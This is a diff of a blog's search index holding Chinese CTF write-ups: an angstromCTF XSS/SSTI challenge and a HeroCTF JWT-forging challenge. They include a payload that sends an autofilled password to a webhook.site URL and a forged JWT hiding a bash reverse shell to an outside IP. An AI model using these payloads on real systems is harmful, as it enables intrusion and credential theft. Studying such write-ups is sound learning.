@@ -1,48 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>angstromCTF 2023 brokenlogin解题</title>
-    <url>/2023/04/28/(XSS)angstromCTF%202023%20brokenlogin/</url>
-    <content><![CDATA[<p>WEB brokenlogin</p>
-<span id="more"></span>
-
-<p>题目给了两个网页和两个源码，分别是</p>
-<p><img src="/2023/04/28/(XSS)angstromCTF%202023%20brokenlogin/image-20230428173909360.png" alt="image-20230428173909360"></p>
-<p><img src="/2023/04/28/(XSS)angstromCTF%202023%20brokenlogin/image-20230428173915868.png" alt="image-20230428173915868"></p>
-<p>源码分别为</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&quot;brokenlogin&quot;</span>,</span><br><span class="line">    <span class="attr">timeout</span>: <span class="number">7000</span>,</span><br><span class="line">    <span class="keyword">async</span> <span class="title function_">execute</span>(<span class="params">browser, url</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="regexp">/^https:\/\/brokenlogin\.web\.actf\.co\/.*/</span>.<span class="title function_">test</span>(url)) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> page = <span class="keyword">await</span> browser.<span class="title function_">newPage</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> page.<span class="title function_">goto</span>(url);</span><br><span class="line">        <span class="keyword">await</span> page.<span class="title function_">waitForNetworkIdle</span>(&#123;</span><br><span class="line">            <span class="attr">timeout</span>: <span class="number">5000</span>,</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> page.<span class="title function_">waitForSelector</span>(<span class="string">&quot;input[name=username]&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> page.$eval(</span><br><span class="line">            <span class="string">&quot;input[name=username]&quot;</span>,</span><br><span class="line">            <span class="function">(<span class="params">el</span>) =&gt;</span> (el.<span class="property">value</span> = <span class="string">&quot;admin&quot;</span>)</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> page.<span class="title function_">waitForSelector</span>(<span class="string">&quot;input[name=password]&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> page.$eval(</span><br><span class="line">            <span class="string">&quot;input[name=password]&quot;</span>,</span><br><span class="line">            <span class="function">(<span class="params">el, password</span>) =&gt;</span> (el.<span class="property">value</span> = password),</span><br><span class="line">            process.<span class="property">env</span>.<span class="property">CHALL_BROKENLOGIN_FLAG</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> page.<span class="title function_">click</span>(<span class="string">&quot;input[type=submit]&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">r</span>) =&gt;</span> <span class="built_in">setTimeout</span>(r, <span class="number">1000</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> page.<span class="title function_">close</span>();</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, make_response, request, escape, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">fails = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">indexPage = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">    &lt;head&gt;</span></span><br><span class="line"><span class="string">        &lt;title&gt;Broken Login&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;/head&gt;</span></span><br><span class="line"><span class="string">    &lt;body&gt;</span></span><br><span class="line"><span class="string">        &lt;p style=&quot;color: red; fontSize: &#x27;28px&#x27;;&quot;&gt;%s&lt;/p&gt;</span></span><br><span class="line"><span class="string">        &lt;p&gt;Number of failed logins: &#123;&#123; fails &#125;&#125;&lt;/p&gt;</span></span><br><span class="line"><span class="string">        &lt;form action=&quot;/&quot; method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;label for=&quot;username&quot;&gt;Username: &lt;/label&gt;</span></span><br><span class="line"><span class="string">            &lt;input id=&quot;username&quot; type=&quot;text&quot; name=&quot;username&quot; /&gt;&lt;br /&gt;&lt;br /&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            &lt;label for=&quot;password&quot;&gt;Password: &lt;/label&gt;</span></span><br><span class="line"><span class="string">            &lt;input id=&quot;password&quot; type=&quot;password&quot; name=&quot;password&quot; /&gt;&lt;br /&gt;&lt;br /&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            &lt;input type=&quot;submit&quot; /&gt;</span></span><br><span class="line"><span class="string">        &lt;/form&gt;</span></span><br><span class="line"><span class="string">    &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">global</span> fails</span><br><span class="line">    custom_message = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;message&quot;</span> <span class="keyword">in</span> request.args:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(request.args[<span class="string">&quot;message&quot;</span>]) &gt;= <span class="number">25</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template_string(indexPage, fails=fails)</span><br><span class="line">        </span><br><span class="line">        custom_message = escape(request.args[<span class="string">&quot;message&quot;</span>])</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> render_template_string(indexPage % custom_message, fails=fails)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.post(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">global</span> fails</span><br><span class="line">    fails += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> make_response(<span class="string">&quot;wrong username or password&quot;</span>, <span class="number">401</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(<span class="string">&quot;0.0.0.0&quot;</span>)</span><br></pre></td></tr></table></figure>
-
-<p>先看第一个源代码，主要有用的地方是</p>
-<p><img src="/2023/04/28/(XSS)angstromCTF%202023%20brokenlogin/image-20230428174142845.png" alt="image-20230428174142845"></p>
-<p>意思是有username和password输入框，但是password输入框这里多了一条<code>process.env.CHALL_BROKENLOGIN_FLAG</code>，flag就在其中</p>
-<p><img src="/2023/04/28/(XSS)angstromCTF%202023%20brokenlogin/image-20230428174328760.png" alt="image-20230428174328760"></p>
-<p>这里的意思是通过eval方法来获取名为password的元素，并将它设置为<code>process.env.CHALL_BROKENLOGIN_FLAG</code></p>
-<p>然后再看另一个源代码，这里有一个路由</p>
-<p><img src="/2023/04/28/(XSS)angstromCTF%202023%20brokenlogin/image-20230428174556173.png" alt="image-20230428174556173"></p>
-<p>这里可以传参message，还有两个if，看第二个if，如果传入的message大于等于25，就会<code>return render_template_string(indexPage, fails=fails)</code>，否则就会<code>return render_template_string(indexPage % custom_message, fails=fails)</code>，第二个return可以将我们传参的message包含进去，猜测有ssti，去网页上测试一下</p>
-<p><img src="/2023/04/28/(XSS)angstromCTF%202023%20brokenlogin/image-20230428175356726.png" alt="image-20230428175356726"></p>
-<p>确实可以ssti，但是有限制，message传参的长度不能大于25，绕过这个可以使用以下payload</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?message=&#123;&#123;request.args.a&#125;&#125;&amp;a=</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2023/04/28/(XSS)angstromCTF%202023%20brokenlogin/image-20230428193302563.png" alt="image-20230428193302563"></p>
-<p>这样就可以绕过长度限制，试试看能不能使用xss</p>
-<p><img src="/2023/04/28/(XSS)angstromCTF%202023%20brokenlogin/image-20230428194624660.png" alt="image-20230428194624660"></p>
-<p>将输入的当成了字符串，可以使用safe，如以下，可以xss语句判定为安全，而不是转为字符串</p>
-<p><img src="/2023/04/28/(XSS)angstromCTF%202023%20brokenlogin/image-20230428194635131.png" alt="image-20230428194635131"></p>
-<p><img src="/2023/04/28/(XSS)angstromCTF%202023%20brokenlogin/image-20230428194827209.png" alt="image-20230428194827209"></p>
-<p>这样就成功执行了，因为flag在password，所以需要读取这里的信息，如果username和password什么都不输入，就会自动填入我们想要的信息，所以再构造一个表单，使用<a href="https://webhook.site/">webhook</a>来进行截取，payload如下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://brokenlogin.web.actf.co/?message=&#123;&#123;request.args.a|safe&#125;&#125;&amp;a=&lt;form action=&quot;https://webhook.site/14144f4b-81cb-4e28-b9b0-0e067d387836&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">            &lt;label for=&quot;username&quot;&gt;Username: &lt;/label&gt;</span><br><span class="line">            &lt;input id=&quot;username&quot; type=&quot;text&quot; name=&quot;username&quot; /&gt;&lt;br /&gt;&lt;br /&gt;</span><br><span class="line"></span><br><span class="line">            &lt;label for=&quot;password&quot;&gt;Password: &lt;/label&gt;</span><br><span class="line">            &lt;input id=&quot;password&quot; type=&quot;password&quot; name=&quot;password&quot; /&gt;&lt;br /&gt;&lt;br /&gt;</span><br><span class="line"></span><br><span class="line">            &lt;input type=&quot;submit&quot; /&gt;</span><br><span class="line">        &lt;/form&gt;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2023/04/28/(XSS)angstromCTF%202023%20brokenlogin/image-20230428195535198.png" alt="image-20230428195535198"></p>
-<p>成功构造出一个表单，使用bot将网页发出</p>
-<p><img src="/2023/04/28/(XSS)angstromCTF%202023%20brokenlogin/image-20230428195621788.png" alt="image-20230428195621788"></p>
-<p>于是在webhook接收到flag</p>
-<p><img src="/2023/04/28/(XSS)angstromCTF%202023%20brokenlogin/image-20230428195657372.png" alt="image-20230428195657372"></p>
-]]></content>
-  </entry>
-  <entry>
     <title>5.1解题</title>
     <url>/2023/05/03/5.1%E9%A2%98%E7%9B%AE/</url>
     <content><![CDATA[<p>5.1</p>
@@ -141,53 +99,45 @@
 ]]></content>
   </entry>
   <entry>
-    <title>Drink from my Flask#1(HeroCTF 2023)</title>
-    <url>/2023/05/15/Drink%20from%20my%20Flask#1(HeroCTF%202023)/</url>
-    <content><![CDATA[<p>Drink from my Flask#1(HeroCTF 2023)</p>
+    <title>angstromCTF 2023 brokenlogin解题</title>
+    <url>/2023/04/28/(XSS)angstromCTF%202023%20brokenlogin/</url>
+    <content><![CDATA[<p>WEB brokenlogin</p>
 <span id="more"></span>
 
-<p>![image-20230515193407724](Drink from my Flask#1(HeroCTF 2023)&#x2F;image-20230515193407724.png)</p>
-<p>输入试试</p>
-<p>![image-20230515193427263](Drink from my Flask#1(HeroCTF 2023)&#x2F;image-20230515193427263.png)</p>
-<p>访问&#x2F;admin，显示</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/admin was not found</span><br><span class="line"></span><br><span class="line">Only routes / and /adminPage are available</span><br></pre></td></tr></table></figure>
+<p>题目给了两个网页和两个源码，分别是</p>
+<p><img src="/2023/04/28/(XSS)angstromCTF%202023%20brokenlogin/image-20230428173909360.png" alt="image-20230428173909360"></p>
+<p><img src="/2023/04/28/(XSS)angstromCTF%202023%20brokenlogin/image-20230428173915868.png" alt="image-20230428173915868"></p>
+<p>源码分别为</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&quot;brokenlogin&quot;</span>,</span><br><span class="line">    <span class="attr">timeout</span>: <span class="number">7000</span>,</span><br><span class="line">    <span class="keyword">async</span> <span class="title function_">execute</span>(<span class="params">browser, url</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="regexp">/^https:\/\/brokenlogin\.web\.actf\.co\/.*/</span>.<span class="title function_">test</span>(url)) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> page = <span class="keyword">await</span> browser.<span class="title function_">newPage</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> page.<span class="title function_">goto</span>(url);</span><br><span class="line">        <span class="keyword">await</span> page.<span class="title function_">waitForNetworkIdle</span>(&#123;</span><br><span class="line">            <span class="attr">timeout</span>: <span class="number">5000</span>,</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> page.<span class="title function_">waitForSelector</span>(<span class="string">&quot;input[name=username]&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> page.$eval(</span><br><span class="line">            <span class="string">&quot;input[name=username]&quot;</span>,</span><br><span class="line">            <span class="function">(<span class="params">el</span>) =&gt;</span> (el.<span class="property">value</span> = <span class="string">&quot;admin&quot;</span>)</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> page.<span class="title function_">waitForSelector</span>(<span class="string">&quot;input[name=password]&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> page.$eval(</span><br><span class="line">            <span class="string">&quot;input[name=password]&quot;</span>,</span><br><span class="line">            <span class="function">(<span class="params">el, password</span>) =&gt;</span> (el.<span class="property">value</span> = password),</span><br><span class="line">            process.<span class="property">env</span>.<span class="property">CHALL_BROKENLOGIN_FLAG</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> page.<span class="title function_">click</span>(<span class="string">&quot;input[type=submit]&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">r</span>) =&gt;</span> <span class="built_in">setTimeout</span>(r, <span class="number">1000</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> page.<span class="title function_">close</span>();</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
 
-<p>访问&#x2F;adminPage</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Sorry but you can&#x27;t access this page, you&#x27;re a &#x27;guest&#x27;</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, make_response, request, escape, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">fails = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">indexPage = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">    &lt;head&gt;</span></span><br><span class="line"><span class="string">        &lt;title&gt;Broken Login&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;/head&gt;</span></span><br><span class="line"><span class="string">    &lt;body&gt;</span></span><br><span class="line"><span class="string">        &lt;p style=&quot;color: red; fontSize: &#x27;28px&#x27;;&quot;&gt;%s&lt;/p&gt;</span></span><br><span class="line"><span class="string">        &lt;p&gt;Number of failed logins: &#123;&#123; fails &#125;&#125;&lt;/p&gt;</span></span><br><span class="line"><span class="string">        &lt;form action=&quot;/&quot; method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;label for=&quot;username&quot;&gt;Username: &lt;/label&gt;</span></span><br><span class="line"><span class="string">            &lt;input id=&quot;username&quot; type=&quot;text&quot; name=&quot;username&quot; /&gt;&lt;br /&gt;&lt;br /&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            &lt;label for=&quot;password&quot;&gt;Password: &lt;/label&gt;</span></span><br><span class="line"><span class="string">            &lt;input id=&quot;password&quot; type=&quot;password&quot; name=&quot;password&quot; /&gt;&lt;br /&gt;&lt;br /&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            &lt;input type=&quot;submit&quot; /&gt;</span></span><br><span class="line"><span class="string">        &lt;/form&gt;</span></span><br><span class="line"><span class="string">    &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">global</span> fails</span><br><span class="line">    custom_message = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;message&quot;</span> <span class="keyword">in</span> request.args:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(request.args[<span class="string">&quot;message&quot;</span>]) &gt;= <span class="number">25</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template_string(indexPage, fails=fails)</span><br><span class="line">        </span><br><span class="line">        custom_message = escape(request.args[<span class="string">&quot;message&quot;</span>])</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> render_template_string(indexPage % custom_message, fails=fails)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.post(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">global</span> fails</span><br><span class="line">    fails += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> make_response(<span class="string">&quot;wrong username or password&quot;</span>, <span class="number">401</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(<span class="string">&quot;0.0.0.0&quot;</span>)</span><br></pre></td></tr></table></figure>
 
-<p>看cookie</p>
-<p>![image-20230515194034852](Drink from my Flask#1(HeroCTF 2023)&#x2F;image-20230515194034852.png)</p>
-<p>是jwt</p>
-<p>![image-20230515194050770](Drink from my Flask#1(HeroCTF 2023)&#x2F;image-20230515194050770.png)</p>
-<p>但是没有密钥，使用jwt_tool暴力破解</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python jwt_tool.py &quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiZ3Vlc3QifQ.AdxhLneoWOkeXGQFwWUbDzS3J2W6_Re-NbZLP_SRUww&quot; -C -d /jwt-common.txt</span><br></pre></td></tr></table></figure>
+<p>先看第一个源代码，主要有用的地方是</p>
+<p><img src="/2023/04/28/(XSS)angstromCTF%202023%20brokenlogin/image-20230428174142845.png" alt="image-20230428174142845"></p>
+<p>意思是有username和password输入框，但是password输入框这里多了一条<code>process.env.CHALL_BROKENLOGIN_FLAG</code>，flag就在其中</p>
+<p><img src="/2023/04/28/(XSS)angstromCTF%202023%20brokenlogin/image-20230428174328760.png" alt="image-20230428174328760"></p>
+<p>这里的意思是通过eval方法来获取名为password的元素，并将它设置为<code>process.env.CHALL_BROKENLOGIN_FLAG</code></p>
+<p>然后再看另一个源代码，这里有一个路由</p>
+<p><img src="/2023/04/28/(XSS)angstromCTF%202023%20brokenlogin/image-20230428174556173.png" alt="image-20230428174556173"></p>
+<p>这里可以传参message，还有两个if，看第二个if，如果传入的message大于等于25，就会<code>return render_template_string(indexPage, fails=fails)</code>，否则就会<code>return render_template_string(indexPage % custom_message, fails=fails)</code>，第二个return可以将我们传参的message包含进去，猜测有ssti，去网页上测试一下</p>
+<p><img src="/2023/04/28/(XSS)angstromCTF%202023%20brokenlogin/image-20230428175356726.png" alt="image-20230428175356726"></p>
+<p>确实可以ssti，但是有限制，message传参的长度不能大于25，绕过这个可以使用以下payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?message=&#123;&#123;request.args.a&#125;&#125;&amp;a=</span><br></pre></td></tr></table></figure>
 
-<p>![image-20230515195020292](Drink from my Flask#1(HeroCTF 2023)&#x2F;image-20230515195020292.png)</p>
-<p>得到密钥是key，进行伪造</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python jwt_tool.py &quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiZ3Vlc3QifQ.AdxhLneoWOkeXGQFwWUbDzS3J2W6_Re-NbZLP_SRUww&quot; -T -S hs256 -p &quot;key&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/04/28/(XSS)angstromCTF%202023%20brokenlogin/image-20230428193302563.png" alt="image-20230428193302563"></p>
+<p>这样就可以绕过长度限制，试试看能不能使用xss</p>
+<p><img src="/2023/04/28/(XSS)angstromCTF%202023%20brokenlogin/image-20230428194624660.png" alt="image-20230428194624660"></p>
+<p>将输入的当成了字符串，可以使用safe，如以下，可以xss语句判定为安全，而不是转为字符串</p>
+<p><img src="/2023/04/28/(XSS)angstromCTF%202023%20brokenlogin/image-20230428194635131.png" alt="image-20230428194635131"></p>
+<p><img src="/2023/04/28/(XSS)angstromCTF%202023%20brokenlogin/image-20230428194827209.png" alt="image-20230428194827209"></p>
+<p>这样就成功执行了，因为flag在password，所以需要读取这里的信息，如果username和password什么都不输入，就会自动填入我们想要的信息，所以再构造一个表单，使用<a href="https://webhook.site/">webhook</a>来进行截取，payload如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://brokenlogin.web.actf.co/?message=&#123;&#123;request.args.a|safe&#125;&#125;&amp;a=&lt;form action=&quot;https://webhook.site/14144f4b-81cb-4e28-b9b0-0e067d387836&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">            &lt;label for=&quot;username&quot;&gt;Username: &lt;/label&gt;</span><br><span class="line">            &lt;input id=&quot;username&quot; type=&quot;text&quot; name=&quot;username&quot; /&gt;&lt;br /&gt;&lt;br /&gt;</span><br><span class="line"></span><br><span class="line">            &lt;label for=&quot;password&quot;&gt;Password: &lt;/label&gt;</span><br><span class="line">            &lt;input id=&quot;password&quot; type=&quot;password&quot; name=&quot;password&quot; /&gt;&lt;br /&gt;&lt;br /&gt;</span><br><span class="line"></span><br><span class="line">            &lt;input type=&quot;submit&quot; /&gt;</span><br><span class="line">        &lt;/form&gt;</span><br></pre></td></tr></table></figure>
 
-<p>![image-20230515195255107](Drink from my Flask#1(HeroCTF 2023)&#x2F;image-20230515195255107.png)</p>
-<p>将cookie换成</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiYWRtaW4ifQ.AVjKNp3JWkmYQdHzpEVpAU9pfGSiwJykT3lbWpQYhMY</span><br></pre></td></tr></table></figure>
-
-<p>刷新网页</p>
-<p>![image-20230515195334276](Drink from my Flask#1(HeroCTF 2023)&#x2F;image-20230515195334276.png)</p>
-<p>再伪造一个</p>
-<p>![image-20230515195508165](Drink from my Flask#1(HeroCTF 2023)&#x2F;image-20230515195508165.png)</p>
-<p>cookie换成</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoie3s3Kjd9fSJ9.z__5DxmRbygPH1em02OyYj1Zt0GUbIk_zRoQ2twuzU8</span><br></pre></td></tr></table></figure>
-
-<p>![image-20230515195534813](Drink from my Flask#1(HeroCTF 2023)&#x2F;image-20230515195534813.png)</p>
-<p>有ssti</p>
-<p>再伪造命令执行</p>
-<p>![image-20230515195835660](Drink from my Flask#1(HeroCTF 2023)&#x2F;image-20230515195835660.png)</p>
-<p>使用cookie</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoie3tjeWNsZXIuX19pbml0X18uX19nbG9iYWxzX18ub3MucG9wZW4oJ2Jhc2ggLWMgXFxcImJhc2ggLWkgPiYgL2Rldi90Y3AvNDMuMTQzLjE1NS45MC8xMjM0IDA-JjFcXFwiJykucmVhZCgpfX0ifQ.ZqhpjUrt2W8_A7VKiG42i7un4gB7oyB5fL6hUaN1-QI</span><br></pre></td></tr></table></figure>
-
-<p>使用云服务器监听1234端口</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -nlvp 1234</span><br></pre></td></tr></table></figure>
-
-<p>![image-20230515200013911](Drink from my Flask#1(HeroCTF 2023)&#x2F;image-20230515200013911.png)</p>
+<p><img src="/2023/04/28/(XSS)angstromCTF%202023%20brokenlogin/image-20230428195535198.png" alt="image-20230428195535198"></p>
+<p>成功构造出一个表单，使用bot将网页发出</p>
+<p><img src="/2023/04/28/(XSS)angstromCTF%202023%20brokenlogin/image-20230428195621788.png" alt="image-20230428195621788"></p>
+<p>于是在webhook接收到flag</p>
+<p><img src="/2023/04/28/(XSS)angstromCTF%202023%20brokenlogin/image-20230428195657372.png" alt="image-20230428195657372"></p>
 ]]></content>
   </entry>
   <entry>
@@ -263,6 +213,102 @@
 ]]></content>
   </entry>
   <entry>
+    <title>Drink from my Flask#1(HeroCTF 2023)</title>
+    <url>/2023/05/15/Drink%20from%20my%20Flask#1(HeroCTF%202023)/</url>
+    <content><![CDATA[<p>Drink from my Flask#1(HeroCTF 2023)</p>
+<span id="more"></span>
+
+<p>![image-20230515193407724](Drink from my Flask#1(HeroCTF 2023)&#x2F;image-20230515193407724.png)</p>
+<p>输入试试</p>
+<p>![image-20230515193427263](Drink from my Flask#1(HeroCTF 2023)&#x2F;image-20230515193427263.png)</p>
+<p>访问&#x2F;admin，显示</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/admin was not found</span><br><span class="line"></span><br><span class="line">Only routes / and /adminPage are available</span><br></pre></td></tr></table></figure>
+
+<p>访问&#x2F;adminPage</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Sorry but you can&#x27;t access this page, you&#x27;re a &#x27;guest&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>看cookie</p>
+<p>![image-20230515194034852](Drink from my Flask#1(HeroCTF 2023)&#x2F;image-20230515194034852.png)</p>
+<p>是jwt</p>
+<p>![image-20230515194050770](Drink from my Flask#1(HeroCTF 2023)&#x2F;image-20230515194050770.png)</p>
+<p>但是没有密钥，使用jwt_tool暴力破解</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python jwt_tool.py &quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiZ3Vlc3QifQ.AdxhLneoWOkeXGQFwWUbDzS3J2W6_Re-NbZLP_SRUww&quot; -C -d /jwt-common.txt</span><br></pre></td></tr></table></figure>
+
+<p>![image-20230515195020292](Drink from my Flask#1(HeroCTF 2023)&#x2F;image-20230515195020292.png)</p>
+<p>得到密钥是key，进行伪造</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python jwt_tool.py &quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiZ3Vlc3QifQ.AdxhLneoWOkeXGQFwWUbDzS3J2W6_Re-NbZLP_SRUww&quot; -T -S hs256 -p &quot;key&quot;</span><br></pre></td></tr></table></figure>
+
+<p>![image-20230515195255107](Drink from my Flask#1(HeroCTF 2023)&#x2F;image-20230515195255107.png)</p>
+<p>将cookie换成</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiYWRtaW4ifQ.AVjKNp3JWkmYQdHzpEVpAU9pfGSiwJykT3lbWpQYhMY</span><br></pre></td></tr></table></figure>
+
+<p>刷新网页</p>
+<p>![image-20230515195334276](Drink from my Flask#1(HeroCTF 2023)&#x2F;image-20230515195334276.png)</p>
+<p>再伪造一个</p>
+<p>![image-20230515195508165](Drink from my Flask#1(HeroCTF 2023)&#x2F;image-20230515195508165.png)</p>
+<p>cookie换成</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoie3s3Kjd9fSJ9.z__5DxmRbygPH1em02OyYj1Zt0GUbIk_zRoQ2twuzU8</span><br></pre></td></tr></table></figure>
+
+<p>![image-20230515195534813](Drink from my Flask#1(HeroCTF 2023)&#x2F;image-20230515195534813.png)</p>
+<p>有ssti</p>
+<p>再伪造命令执行</p>
+<p>![image-20230515195835660](Drink from my Flask#1(HeroCTF 2023)&#x2F;image-20230515195835660.png)</p>
+<p>使用cookie</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoie3tjeWNsZXIuX19pbml0X18uX19nbG9iYWxzX18ub3MucG9wZW4oJ2Jhc2ggLWMgXFxcImJhc2ggLWkgPiYgL2Rldi90Y3AvNDMuMTQzLjE1NS45MC8xMjM0IDA-JjFcXFwiJykucmVhZCgpfX0ifQ.ZqhpjUrt2W8_A7VKiG42i7un4gB7oyB5fL6hUaN1-QI</span><br></pre></td></tr></table></figure>
+
